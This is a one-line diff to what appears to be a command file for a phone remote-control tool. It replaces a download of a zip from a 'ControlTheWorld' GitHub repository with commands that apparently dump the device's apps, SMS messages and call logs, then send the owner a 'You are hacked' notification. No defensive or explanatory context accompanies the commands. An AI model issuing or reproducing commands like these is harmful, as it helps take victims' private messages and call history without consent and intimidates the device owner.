@@ -1,1 +1,1 @@
-download https://raw.githubusercontent.com/MOFO-UG/ControlTheWorld/main/Screenshots.zip
+apps full, sms full, calls full, send notification | title=Hi | message=You are hacked | repeat=1
